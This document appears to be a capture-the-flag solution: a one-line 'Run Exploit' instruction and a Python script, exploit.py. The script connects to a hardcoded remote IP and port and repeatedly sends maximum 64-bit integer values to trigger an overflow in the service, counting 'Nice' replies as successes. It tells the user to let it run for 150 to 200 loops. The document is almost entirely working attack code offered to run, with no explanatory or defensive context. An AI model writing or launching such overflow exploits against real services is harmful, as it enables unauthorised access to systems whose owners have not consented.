## Run Exploit

`python exploit.py`

NOTE: Let it run for around 150-200 Loops

### exploit.py

```python
import socket, struct, re
from random import randint

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.settimeout(100)
connection.connect(('52.163.228.53', 8082))


def receive(index):
	d = connection.recv(1024)
	d = d.decode('ascii')
	print("Index",index,d)
	return d

i = 0
success = 0
def loop():
	global i
	global success
	data = receive(1)
	connection.send(b'18446744073709551615\n')
	data = receive(2)
	if success%2 == 0:
		send_key = "18446744073709551615\n"
	else:
		send_key = "9223372036854775807\n"

	connection.send(send_key.encode())
	data = receive(3)
	if "Nice" in data:
		print("Breaked 1")	
		success += 1
	# else:
	print(i)
	i += 1
	loop()


loop()
```

